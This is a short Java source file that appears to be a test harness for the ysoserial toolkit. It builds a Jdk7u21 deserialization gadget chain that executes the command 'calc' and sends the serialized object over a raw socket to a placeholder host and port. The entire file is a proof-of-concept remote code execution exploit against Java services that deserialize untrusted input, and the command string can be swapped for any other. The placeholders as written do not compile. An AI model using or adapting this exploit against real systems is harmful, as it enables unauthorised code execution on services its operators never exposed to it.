package ysoserial;

import ysoserial.payloads.Jdk7u21;

import java.io.ObjectOutputStream;
import java.net.Socket;


public class exptest {
    public static void main(String[] args) throws Exception {
        Jdk7u21 payloadtest = new Jdk7u21();
        Object vultest = payloadtest.getObject("calc");



        Socket socket = new Socket("ip",port);
        ObjectOutputStream oss = new ObjectOutputStream(socket.getOutputStream());
        oss.writeObject(vultest);
        //System.out.print(vultest);
        oss.flush();
        oss.close();
    }
}
